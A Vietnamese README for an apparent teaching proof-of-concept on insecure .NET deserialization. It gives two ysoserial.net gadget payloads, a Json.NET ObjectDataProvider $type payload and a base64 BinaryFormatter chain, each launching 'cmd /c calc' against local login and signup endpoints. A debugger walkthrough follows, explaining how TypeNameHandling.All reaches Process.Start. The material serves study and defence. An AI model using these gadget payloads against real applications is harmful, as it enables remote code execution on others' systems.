##### Project này là một PoC đơn giản về Insecure Deserialization trong .Net Framework
##### Cách trigger để có thể RCE
- Download source code về
- Chạy bằng Microsoft VS
###### Đối với chức năng login
- Gửi payload sau (được generate bằng công cụ ysoserial.net) đến api `http://localhost:[port]/Account/Login` để mở calc.exe:
```
{
    "username": {
        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
        "MethodName": "Start",
        "MethodParameters": {
            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "$values": [
                "cmd",
                "/c calc"
            ]
        },
        "ObjectInstance": {
            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        }
    },
    "password": "dummy" 
}
```
###### Đối với chức năng signup
- Gửi payload sau (được generate bằng công cụ ysoserial.net) đến api `http://localhost:[port]/Account/Signup` để mở calc.exe:
```
{
    "username": "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAsvYyBjYWxjLmV4ZQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL",
    "password": "1"
}
```
##### Debug
###### Đối với chức năng login (payload đầu tiên)
<br> - Nhìn vào payload thì ta có thể dễ dàng nhận ra một vài điều như này, payload sẽ truyền vào một đối tượng có kiểu là `System.Windows.Data.ObjectDataProvider`, gồm các thuộc tính kèm giá trị của nó là `MethodName` = `Start`, `MethodParameters` là một mảng nhận 2 giá trị lần lượt là `cmd` và `/c calc`, `ObjectInstance` là một đối tượng thuộc kiểu `System.Diagnostics.Process`. Nhưng vấn đề ở đây là luồng di chuyển trong chương trình của payload này như thế nào thì ta không thể nhìn bằng mắt thường và đoán, sau đó thuyết trình theo kiểu TrustMeBro được. Vậy nên giờ ta sẽ debug để hiểu luồng code này nhé.
<br> ![{B8ED210F-C9CF-4189-B298-5AF4F4548B03}](https://github.com/user-attachments/assets/292000fa-cb64-4f62-af83-d466cf80741a)
<br> - Ta đặt debug tại dòng bắt đầu xảy ra Deserialize như hình trên, sau đó bắt đầu chạy debug.
<br> - Gửi payload như ở phần trigger trước đã đề cập.
<br> - Step into lần thứ nhất, ta sẽ thấy chương trình gọi đến phương thức `ToString` trong lớp `JToken` nằm ở `Newtonsoft.Json.Linq`, `Newtonsoft.Json.dll` (hình dưới)
<br> ![{55EFA73A-9DD3-459F-8B0E-3D3B4C7B6CB1}](https://github.com/user-attachments/assets/5c070674-ac93-47ce-9046-b1e2e689fc3c)
<br> - Lúc này `username` đã nhận giá trị là cả cái cụm dài ngoằng ở trong payload mà chúng ta gửi. Ta step out ra để chương trình quay về bước trước đó.
<br> - Step into lần thứ hai, ta sẽ thấy chương trình gọi đến phương thức setter của thuộc tính `TypeNameHandling`, và phương thức này sẽ set giá trị cho thuộc tính (value) là all. (hình dưới)
<br> ![{63125254-23E5-4474-8FE2-740228485151}](https://github.com/user-attachments/assets/be9c5b39-2411-419b-b82b-4e0c5f51efdb)
<br> - Giải thích một chút về `TypeNameHandling` như hình dưới đây:
<br> ![image](https://github.com/user-attachments/assets/08de9722-3b30-4883-92fd-fe3e5dde4c34)
<br> - Tóm lại là với giá trị là all, .NET sẽ deserialize toàn bộ thuộc tính, bao gồm cả `$type` của đối tượng đã được serialize. Như vậy là ta sẽ lợi dụng điều này để inject payload có khả năng RCE được.
<br> - Quay trở lại bài toán ban đầu, ta step out một lần nữa để chương trình quay về bước trước đó, và step into lần thứ 3 để chương trình gọi phương thức `DeseializeObject` thuộc lớp `JsonConvert` của thư viện `Newtonsoft.Json` (hình dưới)
<br> ![{4D004C8A-65C5-4BD9-A37D-6A160C51E4C5}](https://github.com/user-attachments/assets/6324fb0f-6f32-4719-92a4-da2c54704398)
<br> - Value ở trong hình sẽ nhận giá trị là `username` mà chúng ta đã có được từ trước.
<br> - Đầu tiên chương trình sẽ check xem value đó có null không (chắc chắn là không rồi), sau đó bắt đầu gọi phương thức để bắt đầu đọc value đó (hình dưới)
<br> ![{01C227A2-DD2D-44A5-9001-3BEA0D230AD7}](https://github.com/user-attachments/assets/d1ea31c5-e86f-4edc-a096-26f461f3752b)
<br> - Chương trình sẽ thử đọc lần đầu dưới dạng String reader (không thành), lần thứ 2 dưới dạng text reader (không thành) và lần thứ ba, nó sẽ gọi đến phương thức `DeserializeInternal` trong lớp `JsonSerializer` thuộc thư viện `NewtonSoft.Json`
<br> ![{5ED5D7B4-38F2-4E24-894D-8E0C5C28F48A}](https://github.com/user-attachments/assets/d6a6bcb4-ec5b-4cb5-8bb2-b03b13bac83c)
<br> - Sau đó sẽ tạo ra một instance là `serializerReader` thuộc kiểu `JsonSerializerInternalReader`. Chương trình tạo ra tiếp một đối tượng nữa là value để lưu giá trị của `serializerReader` sau khi được Deserialize.
<br> - Chạy qua một vài bước nữa thì chương trình sẽ gọi đến phương thức setter của thuộc tính `MethodName` của class `ObjectDataProvider` thuộc thư viện `System.Windows.Data`, `Presentation Framework.dll` (hình dưới)
<br> ![{BFE6F7CE-C7E0-482B-8EEF-39E9D1C2E71F}](https://github.com/user-attachments/assets/4a46514c-fcd3-4e1b-bed4-3723c7a3ad45)
<br> - Như ta đã thấy, `MethodName` đã nhận giá trị (value) là `Start`, đúng như payload ta gửi.
<br> - Tiếp theo chúng ta sẽ nhảy đến thứ mà ta cần, đó là thuộc tính `ObjectInstance` (hình dưới)
<br> ![{19D72F1D-6DEB-4E56-B8E7-6377B9F971EB}](https://github.com/user-attachments/assets/373d360f-8414-4b5e-a814-c83a3f3d1d43)
<br> - Và thật tuyệt vời, nó đã nhận value là `Process` (hình dưới)
<br> ![{70755075-2E8C-4797-9760-3723056E6C34}](https://github.com/user-attachments/assets/d8515573-fd97-4a64-bf6d-e540157655fb)
<br> - Chương trình sẽ chạy đến `Refresh()`, đây là phương thức công khai của `DataSourceProvider`, được `ObjectDataProvider` kế thừa, dùng để yêu cầu cập nhật hoặc thực thi lại logic cung cấp dữ liệu của `ObjectDataProvider`, và nó sẽ gọi `BeginQuery()`. `BeginQuery()` là một phương thức được ghi đè từ `DataSourceProvider`, chịu trách nhiệm khởi động quá trình truy vấn dữ liệu. Nó sẽ kiểm tra điều kiện và gọi đến `QueryWorker()`. `QueryWorker` là nơi thực hiện logic chính của ObjectDataProvider: tạo đối tượng hoặc gọi phương thức dựa trên cấu hình. Nó sẽ kiểm tra điều kiện và gọi đến `InvokeMethodOnInstance`
<br> - Vì `obj1` là `Process` (không null) nên nó sẽ gọi đến phương thức `InvokeMethodOnInstance()`. Thật tuyệt vời, `_methodParameters.Count` có giá trị là 2, vậy thì nhiều khả năng 2 giá trị đó chính là `cmd` và `calc` mà trong payload có.
<br> - Chương trình tiếp tục gọi `InvokeMember()` (hình dưới)
<br> ![{DF7F298B-3A88-495B-97E0-4BF1F7A4A2A0}](https://github.com/user-attachments/assets/6798c6f9-319e-49e3-a398-21de9e8452d3)
<br> - `Type.InvokeMember` là một phương thức reflection trong .NET, cho phép gọi động một thành viên (phương thức, thuộc tính, v.v.) trên một kiểu hoặc instance. Reflection tìm kiếm một phương thức công khai tên `Start` trên `System.Diagnostics.Process`. Binder mặc định sẽ khớp `objArray` là `(["cmd", "/c calc"])` với overload phù hợp. Vì `objArray` có 2 phần tử, nó chọn `Process.Start(string, string)`. Ta thấy nó nhận 2 tham số của `MethodParameter` như hình dưới, với `fileName` là `cmd` và `arrguments` là `/c calc`. Vậy câu lệnh đầy đủ mà chương trình đã gọi là `System.Diagnostic.Process.Start("cmd", "calc")`
<br> ![{18EE209D-DCE6-497D-9973-3014F02AF9AE}](https://github.com/user-attachments/assets/431c2abe-496b-49f2-8526-9d7f38d338c6)
<br> - F10 một hai phát nữa thì ta đã mở được `calc.exe` rồi.
<br> ![{BEFB13ED-1F48-4BCA-A8AB-4C29FEB20190}](https://github.com/user-attachments/assets/bea7bd52-b1fa-4717-9335-1563b32b2765)

